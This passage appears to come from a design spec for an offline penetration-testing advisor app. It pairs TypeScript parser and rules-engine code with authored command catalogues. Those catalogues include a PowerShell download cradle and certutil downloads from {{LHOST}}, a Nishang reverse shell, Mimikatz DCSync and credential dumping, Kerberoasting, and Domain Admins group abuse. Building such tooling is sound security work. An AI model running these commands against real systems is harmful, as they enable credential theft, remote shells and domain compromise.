      signalIds: dedup([...(best.entry.requiresSignals ?? []), ...signalIds]),
      searchFallbackUsed: false,
      explanation: `Matched phrasebook "${best.entry.intent}" (overlap ${best.score.toFixed(2)} ≥ ${best.entry.minOverlap ?? 0.6}).`,
    };
  }
  if (aliasHits.length) {
    const a = aliasHits.sort((x,y)=> (y.weight??0)-(x.weight??0) || x.id.localeCompare(y.id))[0];
    return {
      query, normalized, matchVia: 'alias', matchedRecordId: a.id,
      techniqueIds: dedup(a.techniqueIds ?? []), commandIds: dedup(a.commandIds ?? []),
      signalIds: dedup(signalIds), searchFallbackUsed: false,
      explanation: `Matched alias "${a.canonical}".`,
    };
  }

  // (5) index fallback over expanded query — FROZEN SearchOptions object, not a string
  const hits = deps.search.search({ query: expandedTokens.join(' ') });
  return {
    query, normalized, matchVia: 'search',
    techniqueIds: dedup(hits.map(h => h.id)), commandIds: [], signalIds: dedup(signalIds),
    searchFallbackUsed: true,
    explanation: `No alias/phrase pinned; fell back to offline index over the expanded query.`,
  };
}
function dedup<T>(xs: T[]): T[] { return [...new Set(xs)].sort((a,b)=>String(a).localeCompare(String(b))); }
function maxAliasLen(a: IntentAlias): number {
  return Math.max(a.canonical.length, ...a.aliases.map(s => s.length));
}
```

**Tests — `src/engine/intent.test.ts`**: golden `query → ordered ids` snapshots for at least:
`"kerberoast"`, `"find a way to dump hashes with powershell"`, `"what can I do with SeImpersonate"`
(→ `signalIds` includes `sig.win.seimpersonate`, `matchVia` deterministic), `"roast spns"`,
`"asreproast"`, an alias-miss falling to search. Assert determinism by running `resolveIntent` twice and
deep-equaling. Assert stoplist KEEPS `ad`,`sam`,`spn`,`smb`,`rce`,`suid`,`db`,`ca`. **Seam test
(mandatory):** instantiate the REAL frozen `SearchEngine` (rehydrated from the serialized index, not a
stub) and pass it as `deps.search`, so the `search(o: SearchOptions)` contract is TYPE-CHECKED at compile
time — the search-string-vs-object seam can never silently regress. This test must call the actual engine
and assert the fallback path returns ordered ids.

### 6.2 F3 privilege parser — `src/engine/privilege-parser.ts`

```ts
import type { EnumSource, PrivilegeSignal, SignalMatch, ParsedBuildInfo } from '../types/advisor';
import type { OS } from '../types/content';

const ANSI = /\x1b\[[0-9;]*m/g;
export function preprocess(text: string): { lines: string[]; raw: string[] } {
  const clean = text.replace(ANSI, '').replace(/\r\n?/g, '\n');
  const raw = clean.split('\n');
  const lines = raw.map(l => l.replace(/\s+/g, ' ').trim());
  return { lines, raw };
}

export function parseEnumOutput(
  text: string, source: EnumSource, signals: PrivilegeSignal[],
): { matches: SignalMatch[]; unrecognizedLines: string[] } {
  const { lines, raw } = preprocess(text);
  const matches: SignalMatch[] = [];
  const recognized = new Set<number>();
  const pool = signals.filter(s => s.source === source || source === 'whoami-all');

  raw.forEach((rawLine, i) => {
    const norm = lines[i];
    if (!norm) return;
    for (const sig of pool) {
      const re = new RegExp(sig.match.pattern, sig.match.flags ?? 'i');
      const m = re.exec(rawLine);
      if (!m) continue;
      // token-priv: fire whether Enabled OR Disabled; record state for DISPLAY only
      const stateRaw = /(Enabled)/i.test(rawLine) ? 'enabled'
        : /(Disabled)/i.test(rawLine) ? 'disabled' : 'present';
      const allow = sig.actionableStates ?? ['enabled','disabled','present'];
      if (!allow.includes(stateRaw as any)) continue;
      const captures: Record<string,string> = {};
      (sig.match.captures ?? []).forEach((name, idx) => { if (m[idx+1] != null) captures[name] = m[idx+1]; });
      matches.push({ signalId: sig.id, source, rawLine, state: stateRaw as any, captures });
      recognized.add(i);
      break; // first signal wins per line (deterministic via pool order)
    }
  });
  // SID-first group match handled by encoding SIDs as patterns in PrivilegeSignal.match (S-1-5-32-551 …)
  const unrecognizedLines = raw.filter((l, i) => l.trim() && !recognized.has(i));
  // de-dup + stable sort
  const seen = new Set<string>();
  const out = matches.filter(m => { const k = m.signalId+'|'+m.rawLine; if (seen.has(k)) return false; seen.add(k); return true; })
    .sort((a,b)=> a.signalId.localeCompare(b.signalId) || a.rawLine.localeCompare(b.rawLine));
  return { matches: out, unrecognizedLines };
}

export function parseBuildInfo(text: string): ParsedBuildInfo {
  const t = text.replace(ANSI,'');
  let buildNumber: number | undefined;
  const win = /\[Version 10\.0\.(\d+)/.exec(t) || /OS Version:\s*\d+\.\d+\.(\d+)/.exec(t);
  if (win) buildNumber = Number(win[1]);
  const kernel = (/Linux\s+\S+\s+(\d+\.\d+\.\d+\S*)/.exec(t) || /(\d+\.\d+\.\d+-\S+)/.exec(t))?.[1];
  const productName = /OS Name:\s*(.+)/.exec(t)?.[1]?.trim();
  const os: OS = buildNumber || /Windows/i.test(t) ? 'windows' : 'linux';
  return { os, buildNumber, productName, kernel };
}
```
Notes: strip ANSI `/\x1b\[[0-9;]*m/g`, CRLF→LF, collapse whitespace (keep `raw` for `rawLine` +
case-preserving captures); block-sniff `source` by header/shape at the view layer; token-priv name
`/Se[A-Z][A-Za-z]+Privilege/` + state `/(Enabled|Disabled)/i` (fire whether Enabled OR Disabled — the
exploit ENABLES the held priv); group match by well-known SID first (544/551/549/550/548), name regex
fallback; sudo `/^\(([^)]*)\)\s*(NOPASSWD:\s*)?(.+)$/` → runas/nopasswd/cmd, basename → GTFOBins-sudo;
getcap `/(cap_[\w,]+)\+(e[ip])/`; SUID basename → GTFOBins-suid; `id` groups split
(docker/lxd/disk/shadow/adm). Unmatched → `unrecognizedLines` (surfaced verbatim, never AI-guessed).

### 6.3 F3 advisor rules engine — `src/engine/privilege-advisor.ts`

```ts
import type { PrivilegeRule, SignalMatch, AdvisorRecommendation, ParsedBuildInfo } from '../types/advisor';

export function advise(
  matches: SignalMatch[], rules: PrivilegeRule[], build?: ParsedBuildInfo,
): AdvisorRecommendation[] {
  const present = new Set(matches.map(m => m.signalId));
  const fired: AdvisorRecommendation[] = [];
  for (const r of rules) {
    if (!r.whenSignals.every(s => present.has(s))) continue;          // ALL present (AND)
    if (r.buildGate) {                                                // build brackets selection
      const b = build?.buildNumber;
      if (r.buildGate.minBuild != null && (b == null || b < r.buildGate.minBuild)) continue;
      if (r.buildGate.maxBuild != null && (b == null || b > r.buildGate.maxBuild)) continue;
    }
    const triggeredBy = matches.filter(m => r.whenSignals.includes(m.signalId));
    fired.push({ rule: r, triggeredBy, unverified: r.confidence === 'unverified' });
  }
  return fired.sort((a,b)=> a.rule.rank - b.rule.rank || a.rule.id.localeCompare(b.rule.id));
}
```
A rule fires iff ALL `whenSignals` present AND `buildGate` brackets the build; sort `rank` then `id`.
Each recommendation cites the exact `SignalMatch.rawLine` that triggered it. `commandId`s render via the
FROZEN `TemplateEngine` at the view layer (advisor never builds command strings). Version-gated
kernel/sudo rules emit `cveLookupHint` → F6 instead of asserting an exploit. Build-sensitive Potato
selection: PrintSpoofer/GodPotato on `minBuild:17763` (verified); JuicyPotato `maxBuild:17134`
(`confidence:'unverified'` + `unverifiedReason` + refs).

**Tests — `privilege-advisor.test.ts` / `privilege-parser.test.ts`**: golden snapshots over fixture
pastes of real `whoami /priv`, `whoami /groups`, `sudo -l`, `getcap -r /`, `id`, `systeminfo`. Assert:
SeImpersonate Disabled still fires; SID `S-1-5-32-551` matches "BUILTIN\Backup Operators" in any locale;
`unrecognizedLines` passthrough verbatim; build 17763 → PrintSpoofer rule, build 17134 → JuicyPotato
`[UNVERIFIED]`; every recommendation's `triggeredBy[0].rawLine` is the exact pasted line.

### 6.4 F6 CVE lookup — `src/engine/cve-lookup.ts`

```ts
import type { CveExploitEntry, CveMatch, VersionRange } from '../types/cve';

export function parseVersion(v: string): { nums: number[]; suffix: string } {
  const s = v.trim().replace(/^v/i,'');
  const m = /^([0-9]+(?:\.[0-9]+)*)(.*)$/.exec(s);
  if (!m) return { nums: [], suffix: s };
  return { nums: m[1].split('.').map(Number), suffix: m[2].trim() };
}
export function compareVersions(a: string, b: string): number {
  const A = parseVersion(a), B = parseVersion(b);
  const n = Math.max(A.nums.length, B.nums.length);
  for (let i=0;i<n;i++){ const d=(A.nums[i]??0)-(B.nums[i]??0); if(d) return Math.sign(d); }
  if (A.suffix && !B.suffix) return -1;      // pre-release < release
  if (!A.suffix && B.suffix) return 1;
  return A.suffix.localeCompare(B.suffix);
}
export function matches(range: VersionRange, v?: string): 'exact'|'in-range'|'prefix'|'any'|null {
  if (range.any) return 'any';
  if (!v) return range.any ? 'any' : null;
  if (range.exact != null) return compareVersions(v, range.exact)===0 ? 'exact' : null;
  if (range.prefix != null) return v.startsWith(range.prefix) ? 'prefix' : null;
  if (range.introduced != null || range.fixedExclusive != null) {
    const geLo = range.introduced == null || compareVersions(v, range.introduced) >= 0;
    const ltHi = range.fixedExclusive == null || compareVersions(v, range.fixedExclusive) < 0;
    return geLo && ltHi ? 'in-range' : null;
  }
  return null;
}
const norm = (s:string)=> s.toLowerCase().replace(/\s+/g,' ').trim();
export function lookupCve(product: string, version: string, entries: CveExploitEntry[]): CveMatch[] {
  const p = norm(product);
  const out: CveMatch[] = [];
  for (const e of entries) {
    const keys = [e.product, ...(e.productAliases ?? [])].map(norm);
    if (!keys.some(k => k === p || k.includes(p) || p.includes(k))) continue;
    const kind = matches(e.versionRange, version || undefined);
    if (kind == null && version) { out.push({ entry: e, matchKind: 'product-only', unverified: true }); continue; }
    const matchKind: CveMatch['matchKind'] = kind === 'exact' ? 'exact' : kind === 'in-range' || kind === 'prefix' ? 'in-range' : 'product-only';
    const unverified = e.confidence === 'unverified' || kind === 'any' || matchKind === 'product-only';
    out.push({ entry: e, matchKind, unverified });
  }
  // always append the searchsploit escape hatch as a synthetic verified-procedure row (handled at view)
  return out.sort((a,b)=>
      verRank(a)-verRank(b) || specRank(a)-specRank(b) || hasIds(b)-hasIds(a) || a.entry.id.localeCompare(b.entry.id));
}
const verRank = (m:CveMatch)=> m.entry.confidence==='verified' && !m.unverified ? 0 : 1;
const specRank = (m:CveMatch)=> ({ exact:0, 'in-range':1, 'product-only':3 } as const)[m.matchKind];
const hasIds = (m:CveMatch)=> (m.entry.cveId?1:0)+(m.entry.edbId?1:0);
```
NO live CVE API, NO auto-download/run. `lookupCve` always offers a synthetic searchsploit row at the
view (`searchsploit {product} {version}` / `searchsploit -m {edbId}`). Degraded / `any` / out-of-range
⇒ `unverified:true` → `[UNVERIFIED]` badge.

**Tests — `cve-lookup.test.ts`**: golden `service/version → ordered ids` for `ProFTPD 1.3.5`,
`vsftpd 2.3.4`, `Apache 2.4.49`, `Apache 2.4.50`, `Apache 2.4.41` (no match → product-only/unverified),
`Webmin 1.890`. Unit-test `compareVersions` ordering incl. pre-release suffix; `matches` for each
`VersionRange` variant.

### 6.5 F5 decision walker — `src/engine/decision-walk.ts`

```ts
import type { DecisionMap, DecisionEdge, DecisionStep, ObservableSignal } from '../types/decision';
import type { PrivilegeSignal } from '../types/advisor';

export function signalMatchesText(sig: ObservableSignal, text: string, privSignals: PrivilegeSignal[]): boolean {
  const hay = (sig.caseInsensitive ?? true) ? text.toLowerCase() : text;
  if (sig.match === 'contains') {
    const needle = (sig.caseInsensitive ?? true) ? sig.value.toLowerCase() : sig.value;
    return hay.includes(needle.trim());
  }
  if (sig.match === 'regex') return new RegExp(sig.value, sig.caseInsensitive ?? true ? 'i':'').test(text);
  // 'signalRef' ⇒ value is a PrivilegeSignal.id — DRY spine: F3 and F5 can never disagree
  const ps = privSignals.find(s => s.id === sig.value);
  return ps ? new RegExp(ps.match.pattern, ps.match.flags ?? 'i').test(text) : false;
}

export function walkDecision(
  map: DecisionMap, nodeId: string, observed: Set<string>,
): DecisionStep | null {
  const outgoing = map.edges.filter(e => e.source === nodeId)
    .sort((a,b)=> (a.priority ?? 100) - (b.priority ?? 100) || a.id.localeCompare(b.id));
  // 1) if-found whose signal observed; 2) if-absent whose signal NOT observed; 3) else fallback
  for (const e of outgoing) {
    if (e.condition.kind === 'if-found' && observed.has(e.condition.signalId)) return step(nodeId, e);
  }
  for (const e of outgoing) {
    if (e.condition.kind === 'if-absent' && !observed.has(e.condition.signalId)) return step(nodeId, e);
  }
  const fallback = outgoing.find(e => e.condition.kind === 'else');
  return fallback ? step(nodeId, fallback) : null; // outcome nodes legitimately return null
}
function step(fromNodeId: string, e: DecisionEdge): DecisionStep {
  return { fromNodeId, chosenEdge: e, nextNodeId: e.target };
}
```
Pure: pick the edge whose condition matches the observed signal, else the `else` edge — never
dead-ends (every non-outcome node has ≥1 outgoing incl. a fallback). `ObservableSignal.match:'signalRef'`
reuses an F3 `PrivilegeSignal.id` so the "if output contains X" matcher is authored ONCE. The view runs
each node's `observes` over the user's pasted output and HIGHLIGHTS matches; it never auto-picks — the
human clicks the branch. `decisionStore` holds the session-only walk trace.

**Tests — `decision-walk.test.ts`**: for `dec.win.tokenpriv`, golden trace `start → … → outcome`
under several observed-sets (SeImpersonate found → potato subtree; nothing found → PowerUp fallback).
Assert every non-outcome node yields a step (never null); assert `signalRef` matcher equals the F3
parser on the same text.

### 6.6 F8 nmap — `src/engine/nmap/{parser,xml,grep,human,router,realm,autofill,cveHandoff}.ts`

`parser.ts` (orchestrator + clock injection):
```ts
import type { NmapParseResult, NmapInputFormat, NmapHost } from '../../types/nmap';
import { parseHuman } from './human'; import { parseGrep } from './grep'; import { parseXml } from './xml';

export function detectFormat(raw: string): NmapInputFormat {
  if (/<nmaprun[\s>]/.test(raw)) return 'xml';
  if (/^(# Nmap|Host:\s)/m.test(raw) && /Ports:/.test(raw)) return 'grep';
  if (/\bPORT\b|\/tcp\b|\/udp\b|Nmap scan report/.test(raw)) return 'human';
  return 'unknown';
}
// now() is INJECTED — no ambient Date.now() (G21). Default is a fixed epoch so tests are deterministic.
export function parse(raw: string, now: () => string = () => '1970-01-01T00:00:00.000Z'): NmapParseResult {
  const warnings: string[] = [];
  const format = detectFormat(raw);
  let hosts: NmapHost[] = [];
  try {
    if (format === 'xml') hosts = parseXml(raw, warnings);
    else if (format === 'grep') hosts = parseGrep(raw, warnings);
    else if (format === 'human') hosts = parseHuman(raw, warnings);
    else warnings.push('Unrecognized nmap format; nothing parsed.');
  } catch (e) { warnings.push(`Parser degraded: ${(e as Error).message}`); }
  // filter: keep open + open|filtered only
  hosts = hosts.map(h => ({ ...h, ports: h.ports.filter(p => p.state === 'open' || p.state === 'open|filtered') }));
  return { format, hosts, warnings, rawLineCount: raw.split('\n').length, parsedAt: now() };
}
```
- `xml.ts`: dep-free regex extractor over `<host>/<port>/<service>/<script>` (DOMParser only as a
  jsdom/browser fallback — NEVER networked, NEVER a new dep).
- `grep.ts`: `Host:` + `Ports:` field splitter (`port/state/proto//service//product version/`).
- `human.ts`: `^(\d+)\/(tcp|udp|sctp)\s+(\S+)\s+(\S+)\s*(.*)$` + `Nmap scan report for <host> (<ip>)`,
  ANSI/noise-tolerant, multi-host, never throws (degrades into `warnings[]`).
- `router.ts`: `route()` fires `ServiceRoute[]` with precedence `product > service > portService > port`;
  de-dupe technique ids; sort `severity` (critical>high>medium>low>info) then specificity then port.
  `explain(firing)` returns a human string naming the matched port/service/product rule.
- `realm.ts`: `inferRealm(host)` — category-deduped weighted scores (kerberos/ldap/smb counted once via
  a `seenCat` set); **AD wins ONLY if `seenCat.has('kerberos') || (seenCat.has('ldap') && seenCat.has('smb'))`**,
  else AD weight folds into windows; Samba `productRegex` overrides 445→linux; `confidence:'verified'`
  only on margin ≥ 2 with a strong AD-gate signal.
- `autofill.ts`: `proposeAutofill(host, userValues)` — `{{RHOST}}`/`{{TARGET}}` ← `host.ip`; AD+hostname
  ⇒ extra `TARGET=FQDN`; `{{DOMAIN}}` ← ldap/kerberos banner or smb-os-discovery.
  `conflictsWithUserValue===true` ⇒ DISPLAY-ONLY, Apply disabled (NEVER overwrite user-set; NEVER
  propose `PASS`/`NTHASH`/`AESKEY`).
- `cveHandoff.ts`: every `cveCandidate` route with `port.version` builds a `CveHandoff` into F6 by
  `entryIds` (loose match ⇒ `unverified:true`; no `-sV` version ⇒ no handoff).
- `themeSwitch.autoApplied` is literally `false`; the UI shows a Confirm-theme button that sets
  `data-os` only on click.

**Tests — `src/engine/nmap/*.test.ts`**: golden fixtures `linux / windows / AD-DC / multi-host ×
human / -oG / -oX` using RFC5737 `198.51.100.x` + `example.lab`. Assert `parsedAt` is EXCLUDED from
equality (compare with it stripped); realm matrix: `88⇒ad`, `389/636/3268+445⇒ad`, `445+3389+5985⇒windows`,
`22+111+2049⇒linux`, `Samba 445⇒linux override`; `route()` ordered firings frozen; autofill never
overwrites a user-set `RHOST`.

---

## 7. ZOD PARITY (NOT frozen)

`src/data/schema.v2.ts` — `.strict()` Zod schemas mirroring EACH new type (`ToolBinarySchema`,
`PrivilegeSignalSchema`, `PrivilegeRuleSchema`, `IntentAliasSchema`, `PhrasebookEntrySchema`,
`CveExploitEntrySchema`, `DecisionMapSchema`, `ServiceRouteSchema`, `CephaloV2BundleSchema`).
`IntentAliasSchema` carries NO `expandsTo` key (expansion is via `canonical` only) — `.strict()` rejects
it, keeping spec/type/code in agreement.
`src/types/schema-parity.v2.test.ts` — type → `z.infer` assignability + `.parse` of every shipped record
+ `.strict()` reject of an unknown key. The frozen `schema-parity.test.ts` stays untouched.
`scripts/build-v2.ts` validates via Zod and emits `arsenal/signals/rules/intents/cve/decisions/nmapRoutes`
JSON artifacts + the aggregate `CephaloV2Bundle`; `vite-plugin-pwa` precaches them (same-origin).

---

## 8. AUTHORING FORMATS + CONTENT (author every leaf; no machine names)

Each leaf: canonical command + `{{VARIABLES}}` + provenance/citation. `{{UPPER_SNAKE}}` tokens only;
filters `quote|upper|lower|urlencode|b64`. Sensitive tokens `{{PASS}} {{NTHASH}} {{AESKEY}}
{{KRB_TICKET}}` masked + session-only. Defanged placeholders: `{{LHOST}}=<tun0-ip>`, `{{RHOST}}` RFC5737,
`{{DOMAIN}}=example.local`. `references[]` reuse the SAME `Reference` records F2 `ToolBinary` uses.

### 8.1 F1 — POWERSHELL / Invoke-* ARSENAL (frozen `Command` rows, `shell:'powershell'`)

Authored as `Command` rows with `shell:'powershell'`, `precondition` string, `severity`, `confidence`,
`references[]`, `tags[]`, `relatedIds[]`. Indexed by the existing offline MiniSearch. Five buckets. Every
PowerView/PowerUp cmd carries a LOAD-DOTSOURCE precondition (`. .\PowerView.ps1` / `IEX`). Each PS-* leaf
must be: `shell:'powershell'` + tokens + precondition + severity + refs/`[UNVERIFIED]` + indexed + wired
to ≥1 DecisionMap + ≥1 PrivilegeRule + a ToolBinary.

- **PowerView** (data-os `'ad'`; precond LOAD-DOTSOURCE; provenance `tool.powerview`). Document BOTH
  legacy `Get-Net*` and modern `Get-Domain*`; flag the fork-divergent one `[UNVERIFIED]`.
  `Get-Domain`/`Get-NetDomain` (`-Domain {{DOMAIN}}`, info) · `Get-DomainController`/`Get-NetDomainController`
  (info) · `Get-DomainUser`/`Get-NetUser` (`-Identity {{USER}} -Properties samaccountname,memberof`, low) ·
  `Get-DomainGroup`/`Get-DomainGroupMember` (`-Identity "Domain Admins"`, low) ·
  `Get-DomainComputer`/`Get-NetComputer` (`-Unconstrained`, low) ·
  `Get-DomainGPO`/`Get-DomainGPOLocalGroup`/`Find-GPOComputerAdmin` (medium) ·
  `Get-DomainObjectAcl` (`-Identity {{TARGET_PRINCIPAL}} -ResolveGUIDs`, medium, F7 seam) ·
  `Find-LocalAdminAccess` (medium) · `Find-DomainShare`/`Invoke-ShareFinder` (`-CheckShareAccess`, low,
  `[UNVERIFIED]` which fork name) · `Find-DomainUserLocation`/`Invoke-UserHunter` (medium) ·
  `Get-DomainTrust`/`Get-NetDomainTrust` (info) · `Get-DomainSPNTicket` (high) · WRITE/ABUSE (sev high,
  verify each): `Set-DomainObject -Set @{serviceprincipalname='fake/svc'}` · `Add-DomainGroupMember
  -Identity 'Domain Admins' -Members {{USER}}` · `Set-DomainObjectOwner` / `Add-DomainObjectAcl`
  (RBCD/ACL, F7).
- **PowerUp** (data-os `'windows'`; precond LOAD-DOTSOURCE + low-priv; provenance `tool.powerup`).
  `Invoke-AllChecks` (info) · `Get-ServiceUnquoted` (high) · `Get-ModifiableService`/`Get-ModifiableServiceFile`
  (high) · `Invoke-ServiceAbuse -Name '{{SERVICE}}' -Command '{{CMD}}'` (critical) · `Write-ServiceBinary`
  (high) · `Write-HijackDll` (high, DLL-hijack helper) · `Get-UnattendedInstallFile` (medium) ·
  `Get-RegistryAlwaysInstallElevated` (high) · `Get-ApplicationHost` (medium) ·
  `Get-ModifiableRegistryAutoRun`/`Get-RegistryAutoLogon` (medium).
- **Invoke-* family.** `Invoke-Kerberoast -OutputFormat Hashcat | Select -Expand Hash` (ad, high) ·
  `Invoke-ASREPRoast -Domain {{DOMAIN}}` (ad, high) · `Invoke-Mimikatz` variants (CommandVariant, NOT
  credMode): `sekurlsa::logonpasswords` · `lsadump::sam` (win/ad, critical; precond local admin/SYSTEM) ·
  **DCSync as its OWN Command**: `Invoke-Mimikatz -Command '"lsadump::dcsync /domain:{{DOMAIN}}
  /user:{{DOMAIN}}\krbtgt"'` (precond replication rights, critical) · `Invoke-RunAs -Username {{USER}}
  -Password {{PASS}} -Command "{{CMD}}"` (high, `[UNVERIFIED]` PS-native name → provenance
  `tool.runascs`) · `Invoke-Command -ComputerName {{RHOST}} -Credential {{CRED}} -ScriptBlock { {{CMD}} }`
  (credMode variant select, high) · `IEX(New-Object Net.WebClient).DownloadString('http://{{LHOST}}/{{SCRIPT}}')`
  (medium, AMSI note `[UNVERIFIED]`) · `Invoke-WebRequest -Uri http://{{LHOST}}/{{FILE}} -OutFile
  C:\Windows\Temp\{{FILE}}` (low). **cmd transfer siblings** (`certutil -urlcache -f http://{{LHOST}}/{{FILE}}
  {{FILE}}`, `bitsadmin /transfer job http://{{LHOST}}/{{FILE}} C:\Windows\Temp\{{FILE}}`) are authored as
  sibling `Command` rows with `shell:'cmd'` and IDs OUTSIDE the `PS-*` namespace — they are the explicit
  ps-shell gate carve-out (see §9), NOT a loosening of the gate.
- **Nishang** (provenance `tool.nishang`). `Invoke-PowerShellTcp -Reverse -IPAddress {{LHOST}} -Port {{LPORT}}`
  (high) · `Copy-VSS` (high) · `Out-Minidump` (critical) · `Invoke-PortScan`/`Get-Information` (info).
- **DLL-hijack weaponization Technique** (methodology-level, human-run): Detect (PowerUp /
  ProcMon described) → Generate (`Write-HijackDll` OR an msfvenom-dll pointer) → Plant (`Copy-Item`) →
  Trigger (`Restart-Service {{SERVICE}}`); search-order specifics `[UNVERIFIED]` + cited.
- **AMSI/CLM/evasion** = methodology pointer + `[UNVERIFIED]` only; NEVER ship a working bypass as
  `'verified'`. The `ps-shell` gate (§9) asserts `shell==='powershell'` for every `PS-*` leaf; the
  documented `cmd` transfer variants are an explicit allowlist carve-out.

### 8.2 F2 — TOOL PROVENANCE (one `ToolBinary` each; engine `src/engine/arsenal.ts`)

Pure selectors `toolsByCategory`, `toolForSignal`. Each entry: `officialRef` (+ `releaseRef?`) = frozen
`Reference` linking the release PAGE (never a guessed pinned asset URL, never a hosted blob);
`shipsOnKali` + `kaliPath?` (`[UNVERIFIED]` until a real Kali confirms); literal `fetchNote`; GhostPack
noted compile-your-own; NetExec (Pennyw0rth/NetExec, `nxc`) is the maintained CrackMapExec successor
(CME archived); JuicyPotato build-gated note. Author: Rubeus, Certify, Seatbelt (GhostPack /
SharpCollection) · Certipy (ly4k, `pip certipy-ad`) · SharpHound + BloodHound (SpecterOps) ·
winPEAS/linPEAS (PEASS-ng) · PrintSpoofer (itm4n) · GodPotato (BeichenDream) · JuicyPotato (ohpe,
build-gated 1809+) · JuicyPotatoNG / RoguePotato / SweetPotato (antonioCoco/CCob) · mimikatz (gentilkiwi) ·
PowerSploit → PowerView/PowerUp (PowerShellMafia, archived) · Nishang (samratashok) · Impacket (fortra) ·
NetExec/nxc (Pennyw0rth) · Responder (lgandx) · Chisel (jpillora) · ligolo-ng (nicocha30) · accesschk +
PsExec (Sysinternals) · RunasCs (antonioCoco). `ToolArsenalView` at `/arsenal`. CI `tool-provenance`:
every entry has `officialRef` + `fetchNote`, NO `binaryUrl`, no committed binary blob.

### 8.3 F3 — ADVISOR RULES (each `signalId` → ≥1 rule → compiling `commandId` + `toolBinaryId` + confidence)

`[UNVERIFIED]` carries reason + refs. Windows token-priv (fire enabled|disabled|present):
`sig.win.seimpersonate` (build≥17763 PrintSpoofer/GodPotato; <17763 JuicyPotato `[UNVERIFIED]`) ·
`seassignprimarytoken` · `sebackup` (`reg save HKLM\SAM`/`SYSTEM` → impacket-secretsdump) ·
`serestore` `[UNV]` · `setakeownership` `[UNV]` · `sedebug` (procdump lsass → mimikatz) ·
`seloaddriver` `[UNV BYOVD]` · `semanagevolume` `[UNV]` · `setcb`/`secreatetoken` `[UNV]`. Windows groups
(SID-first): `backup-operators`(551) · `server-operators`(549 `sc config binPath=`) · `print-operators`(550)
`[UNV]` · `account-operators`(548) · `dnsadmins` `[UNV CVE-2021-40469]` · `gpo-creators` · `remote-mgmt`
(evil-winrm). Linux sudo: `lin-sudo-all` (`sudo /bin/bash`) · `lin-sudo-gtfobins` (per-basename GTFOBins
sudo row) · `lin-sudo-ld-preload` · `lin-sudo-baron-samedit` → F6 hint. Linux suid/cap/group/file:
`lin-suid-gtfobins` (pkexec→PwnKit `[UNV]`→F6) · `cap_setuid+ep` · `cap_dac_read` · `cap_sys_admin` `[UNV]` ·
`cap_sys_ptrace` `[UNV]` · `docker` · `lxd` · `disk`(debugfs) · `shadow` · `adm` · writable `/etc/passwd` ·
writable `/etc/shadow` · kernel→F6 (DirtyCow/DirtyPipe) `[UNV]`. Every signal → ≥1 rule → compiling
`commandId` (TemplateEngine) + `toolBinaryId` + confidence. Every `[UNV]` signal/rule above carries
non-empty `references[]` + surfaces the literal `[UNVERIFIED]` (G20-enforced).

### 8.4 F4 — ASK content (`IntentAlias` + `PhrasebookEntry`)

`IntentAlias` for every core technique (synonyms/abbrevs). `PhrasebookEntry` coverage incl. PowerShell +
AD bridges + advisor-signal phrasings ("what can I do with SeImpersonate" → `requiresSignals:
['sig.win.seimpersonate']`). Stoplist keeps load-bearing short tokens; table-driven stemmer. Every
alias/phrase target id resolves to a LIVE content id (gate `intent-resolves`).

### 8.5 F5/F7 — DECISION TREES (each node: check-command + observe + ≥2 branch edges incl fallback)

- `dec.win.tokenpriv`: root `whoami /priv` + `systeminfo` → SeImpersonate → potato-by-build subtree →
  SYSTEM · SeBackup → hive → secretsdump → PtH · SeDebug → LSASS dump · SeLoadDriver `[UNV]` ·
  SeManageVolume `[UNV]` · Backup Operators (groups) · absent → PowerUp `Invoke-AllChecks`
  service-misconfig.
- `dec.linux.privesc`: root `id; sudo -l; getcap; uname; find -perm -4000` → NOPASSWD → GTFOBins ·
  env_keep/LD_PRELOAD · cap_setuid → escape · SUID → GTFOBins · writable passwd · cron hijack · kernel →
  pwnkit/DirtyPipe `[UNV]` · docker/lxd → container escape · NFS no_root_squash → root.
- `dec.ad.nocreds-to-da`: note "have creds?" → no-creds (Responder / mitm6+relay / GetNPUsers AS-REP /
  PetitPotam+ESC8) · creds (SharpHound / certipy find / GetUserSPNs Kerberoast / ACL / delegation
  subtrees) · local-admin (LSASS/SAM → PtH) · DCSync → krbtgt → DA (+golden note). ADCS ESC1–8
  `verified`, ESC9/10 verified-with-citation, ESC11/12/13 `[UNVERIFIED]`; delegation
  unconstrained/constrained/RBCD S4U subtrees; ACL-abuse → command table (GenericAll/WriteDacl/WriteOwner/
  GenericWrite/ForceChangePassword/AddKeyCredentialLink/AddMember/ReadGMSAPassword) each → frozen Command FK.

Each node: check-command + observe + ≥2 branch edges incl fallback; `signalRef` reuses F3 signals; every
`unverified:true` node carries `references[]` + label-`[UNVERIFIED]` (G20); `decision-reachability` green.

### 8.6 F6 — CVE DATASET (each: cited NVD+EDB `Reference`; `searchsploitTerm` EXACT; uncertain ⇒ `unverified`)

vsftpd 2.3.4 backdoor (CVE-2011-2523) · ProFTPD 1.3.5 mod_copy (CVE-2015-3306) · Apache 2.4.49/2.4.50
(CVE-2021-41773 / CVE-2021-42013) · Samba is_known_pipename (CVE-2017-7494) · OpenSMTPD (CVE-2020-7247) ·
Shellshock (CVE-2014-6271) · Drupalgeddon2 (CVE-2018-7600) · Webmin 1.890 (CVE-2019-15107) · PwnKit
(CVE-2021-4034). Anything unverifiable vs the local searchsploit DB ⇒ `confidence:'unverified'`. NEVER
invent ids.

### 8.7 F8 — NMAP ROUTES (one `ServiceRoute` per catalog port → REAL existing Technique ids)

`21 ftp · 22 ssh(linux, nix w0.5) · 23 · 25/465/587 smtp · 53 dns · 79 · 80/443/8080/8000 web · 88
kerberos(ad, kerberos w3) · 110/143/993/995 · 111 rpcbind(linux, nix) · 135 (windows, smb) · 139/445
smb(windows, smb w2) + Samba product override→linux · 161udp snmp · 389/636/3268/3269 ldap(ad, ldap w3) ·
873 rsync · 1433 mssql(windows) · 1521 · 2049 nfs(linux, nix) · 3306 mysql · 3389 ms-wbt-server(windows,
rdp w2) · 5432 postgres · 5900 vnc · 5985/5986 winrm(windows, winrm w2) · 6379 redis · 9200 elastic ·
27017 mongo · fallback tcpwrapped/unknown→info`. References: hacktricks / official tool docs. Realm-
inference test matrix: `88⇒ad · 389/636/3268+445⇒ad · 445+3389+5985⇒windows · 22+111+2049⇒linux · Samba
445⇒linux override · AD-gate (kerberos OR ldap+smb)`.

### 8.8 ANTI-FABRICATION (all leaves)
No invented PowerView/PowerUp names (document legacy+modern, flag uncertain `[UNVERIFIED]`) · no invented
flags/DLL names/build numbers/CLSIDs/EDB ids/CVE numbers/version offsets/searchsploit terms · defanged
placeholders only (RFC5737 / RFC3849 / example.local|example.lab) · sensitive vars masked + session-only ·
NO machine names anywhere. NAME existence (function/flag/CLSID) is not machine-verifiable; CI (G20)
